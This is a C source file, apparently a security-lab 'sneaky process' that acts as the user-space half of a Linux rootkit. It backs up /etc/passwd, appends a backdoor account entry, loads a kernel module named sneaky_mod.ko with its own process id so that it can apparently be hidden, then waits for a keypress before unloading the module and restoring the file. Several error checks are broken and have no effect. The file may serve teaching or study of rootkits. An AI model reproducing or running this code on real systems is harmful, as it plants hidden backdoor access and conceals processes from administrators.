#include "stdlib.h"
#include "stdio.h"
#include "printf.h"
#include "unistd.h"
#include "fcntl.h"
#include "dirent.h"
#include "string.h"
#include "sys/types.h"
#include "sys/stat.h"

/**
 * @brief copy content from source to destination   
 * @param src absolute path of source file
 * @param dest absolute path of destination file
 */
void copyFile(const char * src, const char * dest){
    FILE * fd_src = fopen(src, "r+");
    FILE * fd_dest = fopen(dest, "w");
    if (fd_src == NULL){
        fprintf(stderr, "Can't open the file : %s\n", src); 
        EXIT_FAILURE;
    };
    if (fd_dest == NULL){
        fprintf(stderr, "Can't open the file : %s\n", dest); 
        EXIT_FAILURE;
    };
    //copy the content from source to dest
    char ch;
    while((ch = fgetc(fd_src)) != EOF){
        fputc(ch, fd_dest);
    }
    fclose(fd_src);
    fclose(fd_dest);
}
/**
 * @brief append text to file's end
 * @param fileName file's name
 * @param text text you want to append
 */
void writeToFileEnd(const char * fileName, const char * text){
    FILE * fd = fopen(fileName, "a+");
    if (fd == NULL){
        fprintf(stderr, "can't open the /etc/passwd\n");
        EXIT_FAILURE;
    }
    fwrite(text, strlen(text), 1, fd);
    fclose(fd);
}

int main(){
    printf("sneaky_process pid= %d\n", (int)getpid());
    copyFile("/etc/passwd", "/tmp/passwd");// "/etc/passwd" -> "/home/vcm/passtest"
    writeToFileEnd("/etc/passwd","sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
    //load the pid and sneaky_mod.ko into the kernel

    char command[100];
    sprintf(command, "insmod sneaky_mod.ko sneakyProcessId=%d", (int)getpid());
    if(system(command) == -1){
        fprintf(stderr, "can't load sneaky module!\n"); 
        return EXIT_FAILURE;
    }

    //busy wait until press 'q'
    int flag = 1;
    char press;
    while(flag){
        if ((press = getchar()) != 'q'){
            flag = 1;
        }else{
            flag = 0;
        }
    }
    system("rmmod sneaky_mod.ko");
    system("cp /tmp/passwd /etc/passwd");
    system("rm /tmp/passwd"); 
    return 0;
}